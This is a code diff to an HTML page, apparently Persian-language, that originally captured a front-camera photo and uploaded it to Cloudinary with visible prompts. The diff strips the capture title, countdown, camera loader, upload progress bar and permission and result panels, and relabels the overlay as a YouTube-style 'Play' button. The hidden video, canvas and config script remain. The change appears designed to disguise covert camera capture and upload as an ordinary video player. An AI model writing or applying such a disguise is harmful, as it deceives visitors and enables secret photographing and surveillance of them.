@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <meta name="apple-mobile-web-app-capable" content="yes" />
   <meta name="mobile-web-app-capable" content="yes" />
-  <title>عکس‌برداری | IMAGE</title>
+  <title>IMAGE</title>
   <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap" rel="stylesheet" />
   <style>
     * { box-sizing: border-box; }
@@ -26,7 +26,7 @@
     }
 
     .status-badge {
-      display: flex;
+      display: none;
       align-items: center;
       justify-content: center;
       gap: 8px;
@@ -38,18 +38,17 @@
       color: rgba(255, 255, 255, 0.75);
     }
 
+    .status-badge.visible {
+      display: flex;
+    }
+
     .status-dot {
       width: 8px;
       height: 8px;
       border-radius: 50%;
-      background: #fbbf24;
+      background: #f87171;
       flex-shrink: 0;
     }
-
-    .status-dot.amber { background: #fbbf24; }
-    .status-dot.blue { background: #38bdf8; }
-    .status-dot.green { background: #34d399; }
-    .status-dot.red { background: #f87171; }
 
     .video-wrapper {
       position: relative;
@@ -63,18 +62,12 @@
       background: #111;
     }
 
-    #video,
-    #preview {
+    #video {
       width: 100%;
       height: 100%;
       display: block;
       object-fit: cover;
       transform: scaleX(-1);
-    }
-
-    #preview.hidden,
-    #video.hidden {
-      display: none;
     }
 
     .noise-container {
@@ -157,211 +150,33 @@
       pointer-events: none;
     }
 
-    .countdown-overlay {
-      position: absolute;
-      inset: 0;
-      display: none;
-      align-items: center;
-      justify-content: center;
-      background: rgba(0, 0, 0, 0.45);
-      backdrop-filter: blur(4px);
-      z-index: 15;
-    }
-
-    .countdown-overlay.visible {
-      display: flex;
-    }
-
-    .countdown-number {
-      font-size: 5rem;
-      font-weight: 700;
-      text-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
-    }
-
-    .camera-loader {
-      position: absolute;
-      inset: 0;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      background: rgba(10, 10, 10, 0.85);
-      z-index: 25;
-    }
-
-    .camera-loader.visible {
-      display: flex;
-    }
-
-    .spinner {
-      width: 40px;
-      height: 40px;
-      border: 4px solid rgba(255, 255, 255, 0.15);
-      border-top-color: #ff0000;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .upload-overlay {
-      position: absolute;
-      inset: auto 0 0;
-      padding: 16px;
-      background: linear-gradient(transparent, rgba(0, 0, 0, 0.85));
-      z-index: 18;
-      display: none;
-    }
-
-    .upload-overlay.visible {
-      display: block;
-    }
-
-    .upload-label {
-      display: flex;
-      justify-content: space-between;
-      font-size: 0.75rem;
-      color: rgba(255, 255, 255, 0.65);
-      margin-bottom: 8px;
-    }
-
-    .upload-bar-track {
-      height: 6px;
-      border-radius: 999px;
-      background: rgba(255, 255, 255, 0.15);
-      overflow: hidden;
-    }
-
-    .upload-bar-fill {
-      height: 100%;
-      width: 0;
-      border-radius: 999px;
-      background: #ff0000;
-      transition: width 0.3s ease;
-    }
-
-    .panel {
-      width: 100%;
-      max-width: 480px;
-      margin-top: 12px;
-      padding: 14px 16px;
-      border-radius: 12px;
-      font-size: 0.875rem;
-      display: none;
-    }
-
-    .panel.visible {
-      display: block;
-    }
-
-    .panel-error {
-      background: rgba(239, 68, 68, 0.12);
-      border: 1px solid rgba(239, 68, 68, 0.35);
-      color: #fca5a5;
-    }
-
-    .panel-warn {
-      background: rgba(251, 191, 36, 0.1);
-      border: 1px solid rgba(251, 191, 36, 0.35);
-      color: #fde68a;
-    }
-
-    .panel-success {
-      background: rgba(52, 211, 153, 0.1);
-      border: 1px solid rgba(52, 211, 153, 0.35);
-    }
-
-    .panel-title {
-      font-weight: 600;
-      margin: 0 0 4px;
-    }
-
-    .panel-body {
-      margin: 0;
-      font-size: 0.8rem;
-      opacity: 0.9;
-      word-break: break-all;
-    }
-
-    .panel-link {
-      display: inline-block;
-      margin-top: 8px;
-      color: #ff6b6b;
-      font-size: 0.8rem;
-    }
-
     @media (prefers-reduced-motion: reduce) {
       .noise-container { animation: none; }
-      .frost-overlay, #playButton, .upload-bar-fill { transition: none; }
-      .spinner { animation: none; }
+      .frost-overlay, #playButton { transition: none; }
     }
   </style>
 </head>
 <body>
 
-  <div class="status-badge">
-    <span id="statusDot" class="status-dot amber"></span>
-    <span id="statusText">در حال آماده‌سازی...</span>
+  <div id="statusBadge" class="status-badge">
+    <span class="status-dot"></span>
+    <span id="statusText"></span>
   </div>
 
   <div class="video-wrapper">
     <video id="video" playsinline webkit-playsinline muted></video>
-    <img id="preview" class="hidden" alt="پیش‌نمایش" />
     <canvas id="canvas" hidden></canvas>
 
     <div class="noise-container" aria-hidden="true"></div>
 
-    <div id="frostOverlay" class="frost-overlay" role="button" tabindex="0" aria-label="شروع عکس‌برداری">
-      <button id="playButton" type="button" aria-label="شروع عکس‌برداری">
+    <div id="frostOverlay" class="frost-overlay" role="button" tabindex="0" aria-label="Play">
+      <button id="playButton" type="button" aria-label="Play">
         <svg viewBox="0 0 68 48" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
           <path d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55 C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19 C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#FF0000"/>
           <path d="M 45,24 27,14 27,34" fill="#FFFFFF"/>
         </svg>
       </button>
     </div>
-
-    <div id="countdownOverlay" class="countdown-overlay">
-      <span id="countdownNumber" class="countdown-number">۳</span>
-    </div>
-
-    <div id="cameraLoader" class="camera-loader">
-      <div class="spinner"></div>
-      <p>فعال‌سازی دوربین جلو...</p>
-    </div>
-
-    <div id="uploadSection" class="upload-overlay">
-      <div class="upload-label">
-        <span>آپلود به Cloudinary</span>
-        <span id="uploadPercent">۰٪</span>
-      </div>
-      <div class="upload-bar-track">
-        <div id="uploadBar" class="upload-bar-fill"></div>
-      </div>
-    </div>
-  </div>
-
-  <div id="resultCard" class="panel panel-success">
-    <p id="resultTitle" class="panel-title" style="color:#34d399">آپلود موفق</p>
-    <p id="resultMessage" class="panel-body"></p>
-    <a id="resultLink" class="panel-link" href="#" target="_blank" rel="noopener">مشاهده عکس</a>
-  </div>
-
-  <div id="permissionCard" class="panel panel-warn">
-    <p class="panel-title">دسترسی به دوربین</p>
-    <p id="permissionMessage" class="panel-body"></p>
-  </div>
-
-  <div id="errorCard" class="panel panel-error">
-    <p class="panel-title">خطا</p>
-    <p id="errorMessage" class="panel-body"></p>
-  </div>
-
-  <div id="configWarning" class="panel panel-warn">
-    <p class="panel-title">تنظیمات Cloudinary ناقص است</p>
-    <p class="panel-body">فایل config.js را باز کنید و cloudName و uploadPreset را وارد کنید.</p>
   </div>
 
   <script src="config.js"></script>
